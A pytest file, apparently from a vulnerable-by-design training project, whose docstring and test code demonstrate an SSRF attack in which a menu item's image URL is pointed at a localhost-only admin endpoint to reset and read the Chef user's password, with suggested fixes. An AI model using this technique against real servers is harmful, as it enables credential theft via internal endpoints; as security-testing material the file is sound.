import base64
import json

from db.models import User, UserRole


def test_ssrf(test_db, employee_client, anon_client, requests_mock, mocker):
    """
    Note:
        Using employee role, I was able to access more endpoints
        and found more vulnerabilities in endpoints restricted to employees.

        I found a PUT "/menu" endpoint that allows to create menu items
        and set images for these items as employee.
        You won't believe but it's possible to set an image via URL.
        The image is then downloaded and stored in the database as
        base64 encoded format.
        I could use this to perform SSRF attack!

        I also found a hidden endpoint "/admin/reset-chef-password"
        which can be used to reset the password of the Chef user
        but it can be accessed only from localhost.

        ...and I got an idea!

        I can use SSRF in "/menu" which will allow me to make requests from
        the server, so I can access the "/admin/reset-chef-password" endpoint
        and get the new password of the Chef user!

        btw. the woman still did not reply on my questions related
        to the API. This job looks really weird now. I need to make sure
        that she is the owner of this restaurant really quick.

    Possible fix:
        Probably, it could be fixed by allowing only chosen domains
        to be used to host images for menu. Also, would be cool to
        restrict filetypes to images only.

        I think it could be fixed in "apis/menu/utils.py" in "_image_url_to_base64"
        function, or in "menu/service.py" in "update_menu_item" function.
    """

    # here, is the test confirming the vulnerability:

    # adding a test Chef user
    chef_user = User(
        username="chef",
        password="password",
        first_name="",
        last_name="",
        phone_number="",
        role=UserRole.CHEF,
    )
    test_db.add(chef_user)
    test_db.commit()

    # for testing purposes I had to mock IP address and requests library response
    mock_client = mocker.patch("fastapi.Request.client")
    mock_client.host = "127.0.0.1"

    def reset_callback(request, context):
        return anon_client.get("/admin/reset-chef-password").json()

    requests_mock.get(
        "http://localhost:8000/admin/reset-chef-password",
        json=reset_callback,
    )

    # here is the main part of the vulnerability proof of concept
    menu_item = {
        "name": "Item",
        "price": 0.00,
        "category": "",
        "description": "",
        "image_url": "http://localhost:8000/admin/reset-chef-password",  # SSRF main part
    }

    response = employee_client.put(f"/menu", content=json.dumps(menu_item))
    assert response.status_code == 201

    # obtaining the base64 encoded result from admin/reset-chef-password endpoint
    base64_reset_result = response.json().get("image_base64")
    reset_result = json.loads(base64.b64decode(base64_reset_result))

    # checking if the password is returned in the base64 encoded response
    # returned password in the response is a proof that the SSRF attack was successful
    assert reset_result.get("password") is not None
